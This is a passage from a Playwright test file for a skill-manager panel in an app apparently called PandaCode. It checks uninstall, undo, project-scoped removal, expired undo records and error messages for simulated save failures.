    await expect(undone).toBeHidden();
    await expect(summary(page)).toContainText('Put docx back.');
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_undo_uninstall').length)).toBe(1);
  });

  test('in a project, Uninstall removes only that project’s copies; a failed undo says why', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'orbit' }).click();
    // A user-level skill has no copy to remove in orbit: no Uninstall there.
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    await expect(row(page, 'pdf').getByRole('button', { name: 'Uninstall pdf…' })).toHaveCount(0);
    const deploy = row(page, 'orbit-deploy');
    await deploy.locator('[data-sm-expand]').click();
    await deploy.getByRole('button', { name: 'Uninstall orbit-deploy…' }).click();
    await expect(deploy.getByRole('group', { name: 'Uninstall orbit-deploy from orbit' }).locator('p')).toHaveText('Uninstall orbit-deploy from orbit? PandaCode moves this project’s copies aside; you can undo it.');
    await deploy.getByRole('button', { name: 'Uninstall', exact: true }).click();
    await expect(deploy).toHaveCount(0);
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_uninstall').at(-1).args)).toEqual({ name: 'orbit-deploy', projectId: 'project-1' });
    const undone = page.locator('[data-sm-undone]');
    await expect(undone).toContainText('Uninstalled orbit-deploy from orbit.');
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_undo_uninstall'; });
    await undone.getByRole('button', { name: 'Undo uninstalling orbit-deploy' }).click();
    await expect(undone).toContainText('Couldn’t undo: Could not save skill manager preferences: disk full');
    await expect(undone.getByRole('button', { name: 'Undo uninstalling orbit-deploy' })).toBeEnabled();
    await undone.getByRole('button', { name: 'Undo uninstalling orbit-deploy' }).click();
    await expect(deploy).toBeVisible();
  });

  test('an uninstall that drops older Undo records says so on one quiet line', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { undoLimit: 1 }; });
    await open(page);
    const undone = page.locator('[data-sm-undone]');
    for (const name of ['docx', 'pdf']) {
      await row(page, name).locator('[data-sm-expand]').click();
      await row(page, name).getByRole('button', { name: `Uninstall ${name}…` }).click();
      await row(page, name).getByRole('button', { name: 'Uninstall', exact: true }).click();
      await expect(undone).toContainText(`Uninstalled ${name} from all projects.`);
    }
    await expect(undone.locator('.skill-manager-undo-expired')).toHaveText('Older uninstalls can no longer be undone (docx).');
    const text = (await undone.locator('.skill-manager-undo-text').boundingBox())!, expired = (await undone.locator('.skill-manager-undo-expired').boundingBox())!;
    expect(expired.y).toBeGreaterThanOrEqual(text.y + text.height - 1);
    await page.locator('#host').evaluate(el => { el.style.maxWidth = '760px'; });
    await page.locator('.skill-manager').screenshot({ path: 'test-results/skill-manager-expired-undo.png' });
  });

  test('a refused uninstall keeps the row and shows native’s reason beside it', async ({ page }) => {
    await open(page);
    const docx = row(page, 'docx');
    await docx.locator('[data-sm-expand]').click();
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_uninstall'; });
    await docx.getByRole('button', { name: 'Uninstall docx…' }).click();
    await docx.getByRole('button', { name: 'Uninstall', exact: true }).click();
    await expect(docx.getByRole('alert')).toHaveText('Couldn’t uninstall docx: Could not save skill manager preferences: disk full');
    await expect(page.locator('[data-sm-undone]')).toBeHidden();
  });
});
